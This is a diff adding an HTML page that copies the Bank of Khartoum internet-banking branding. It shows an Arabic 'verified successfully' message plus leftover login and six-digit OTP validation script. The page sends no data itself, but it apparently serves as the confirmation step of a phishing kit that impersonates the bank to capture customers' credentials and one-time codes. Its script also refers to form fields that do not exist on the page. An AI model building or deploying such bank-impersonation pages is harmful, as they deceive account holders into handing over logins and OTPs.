@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank of Khartoum - succes</title>
+     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+       
+     <link rel="icon" href="img/icon book.png" type="image/png">
+    <style>
+        /* Reset and base styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'cairo';
+       background: url('img/background.png') no-repeat center center fixed ; /* Local background image */
+            color: #3f3a3a;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        /* Header with logo */
+        header {
+            width: 100%;
+            height: 120px;
+            display: flex;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .logo-left {
+            flex: 1;
+            background-color:#cc941c; /* Red */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+           text-align: center;
+            color: white;
+        }
+        .logo-right {
+       
+            background-color:  #d32f2f; /* Yellow */
+            display: flex;
+     
+        }
+        .logo-right img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+
+        /* Main content with centered login form */
+        main {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .login-form {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            direction: rtl;
+        }
+        label {
+    display: block;
+    text-align: right;
+    direction: rtl;
+    font-size: 0.8rem;
+    opacity: 70%;
+}
+.btn:disabled {
+    background-color: #d15757;
+    cursor: not-allowed;
+    opacity: 0.6;
+}
+
+
+        .login-form h2 {
+            margin-bottom: 20px;
+            font-size: 1.2rem;
+            color: #585958;;
+        }
+           .back {
+            margin-bottom: 20px;
+            font-size: 1.5rem;
+            color: #d62e2e;
+            text-align: center;
+            padding-top: 6%;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #555;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 1rem;
+            transition: border-color 0.3s ease;
+        }
+        .form-group input:focus {
+            outline: none;
+            border-color: #3498db;
+        }
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #d62e2e;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+        }
+        .btn:hover {
+            background-color: #cc4848;
+            transform: translateY(-2px);
+        }
+
+        /* Footer with social media icons */
+        footer {
+            width: 100%;
+            padding: 20px;
+          background: linear-gradient(#bfc1c4, #eff0f1, #fcfdfd, #fff);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 10px;
+    border-top: 3px solid #bc262a;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    text-align: center;
+    line-height: 40px;
+}
+        
+        .social-icons {
+            display: flex;
+            gap: 20px;
+        }
+        .social-icon {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background-color: #34495e;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 1.5rem;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.3s ease;
+        }
+        .social-icon:hover {
+            background-color: #bc262a;
+            transform: scale(1.1);
+        }
+        .social-icon svg {
+            width: 24px;
+            height: 24px;
+        }
+
+        .footer {
+  width: 100%;
+  padding: 16px 0;
+  background-color: #111;
+}
+
+.social-icons {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  gap: clamp(10px, 3vw, 20px); /* يتجاوب تلقائياً */
+  flex-wrap: wrap; /* في الشاشات الصغيرة ينزل سطر */
+}
+
+.social-icon {
+  width: clamp(36px, 6vw, 48px);
+  height: clamp(36px, 6vw, 48px);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.social-icon img {
+  width: 100%;
+  height: 100%;
+  object-fit: contain; /* يحافظ على الدائرة */
+}
+
+.form-group input,
+.form-group select {
+  padding: 10px;
+  font-size: 1rem;
+  border-radius: 5px;      /* حواف دائرية متناسقة */
+  border: 1px solid #ccc;
+  background-color: #fff;  /* نفس خلفية حقل الإجابة */
+  appearance: none;        /* لإزالة أي تصميم افتراضي للمتصفح */
+  -webkit-appearance: none;
+  -moz-appearance: none;
+}
+
+.form-group select {
+  cursor: pointer;         /* مؤشر اليد عند المرور */
+}
+
+
+.form-group {
+  display: flex;
+  flex-direction: column;
+  margin-bottom: 15px;
+  width: 100%; /* يجعل الحقول ممتدة بالكامل */
+  max-width: 400px; /* نفس الحد الأقصى للفورم */
+  margin-left: auto;
+  margin-right: auto;
+}
+
+.form-group input,
+.form-group select {
+  width: 100%;          /* نفس عرض الحاوية */
+  padding: 10px;
+  font-size: 1rem;
+  border-radius: 5px;
+  border: 1px solid #ccc;
+  background-color: #fff;
+  box-sizing: border-box; /* لضمان أن padding لا يزيد عن العرض */
+}
+
+
+
+
+
+
+        /* Responsive design */
+        @media (max-width: 768px) {
+            header {
+                height: 80px;
+            }
+            .logo-left {
+                font-size: 1.3rem;
+            }
+            .logo-right img {
+                max-width: 100%;
+                max-height: 100%;
+            }
+            .login-form {
+                padding: 20px;
+            }
+            .social-icons {
+                gap: 15px;
+            }
+            .social-icon {
+                width: 40px;
+                height: 40px;
+                font-size: 1.2rem;
+            }
+        }
+        @media (max-width: 480px) {
+            .logo-left {
+                font-size: 1.2rem;
+            }
+            .logo-right img {
+                max-width: 100%;
+                max-height: 100%;
+            }
+            .login-form h2 {
+                font-size: 1rem;             
+            }
+              .title {
+                font-size: 1.2rem;             
+            }
+            .social-icons {
+                gap: 10px;
+            }
+            .social-icon {
+                width: 35px;
+                height: 35px;
+                font-size: 1rem;
+            }
+ .footer {
+    padding: 12px 0;
+  }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo-left"> Welcome to iBOK Internet Banking</div>
+        <div class="logo-right">
+            <img src="img/1000423167.png">
+        </div>
+    </header>
+<div class="back">Internet Banking - Login</div>
+    <main>
+<form class="login-form">
+    <h2>✅ تم التحقق بنجاح</h2>
+  <p>شكرًا لك،  سيتم ارسال نسخة الي بريدك الالكتروني.</p>
+  </form>
+
+
+
+
+    </main>
+
+  <footer class="footer">
+  <div class="social-icons">
+    <a href="https://www.facebook.com/BankofKhartoum1913?" class="social-icon">
+      <img src="img/icon face.png" alt="Facebook">
+    </a>
+    <a href="https://x.com/bankofkhartoum" class="social-icon">
+      <img src="img/icon x.png" alt="X">
+    </a>
+      <a href="https://www.linkedin.com/company/bank-of-khartoum/" class="social-icon">
+      <img src="img/icon linedin.png" alt="LinkedIn">
+    </a>
+    <a href="https://bankofkhartoum.com/" class="social-icon">
+      <img src="img/icon book.png" alt="Bank">
+    </a>
+  </div>
+</footer>
+
+
+
+    <script>
+        // Simple JavaScript for form validation (optional enhancement)
+        document.querySelector('.login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            if (username && password) {
+                alert('Login successful! (This is a demo)');
+                // In a real app, handle authentication here
+            } else {
+                alert('Please fill in all fields.');
+            }
+        });
+
+        // Smooth hover effects are handled via CSS transitions
+
+      function checkOTP() {
+    const otpInput = document.getElementById('otp');
+    const otpBtn = document.getElementById('otpBtn');
+    // تحقق إذا كان الإدخال عبارة عن 6 أرقام
+    if (/^\d{6}$/.test(otpInput.value)) {
+        otpBtn.disabled = false;
+    } else {
+        otpBtn.disabled = true;
+    }
+}
+
+function validateOTP() {
+    const otpInput = document.getElementById('otp');
+    if (!/^\d{6}$/.test(otpInput.value)) {
+        alert('الرجاء إدخال 6 أرقام صحيحة');
+        return false;
+    }
+    return true;
+}
+    </script>
+</body>
+</html>
+ 
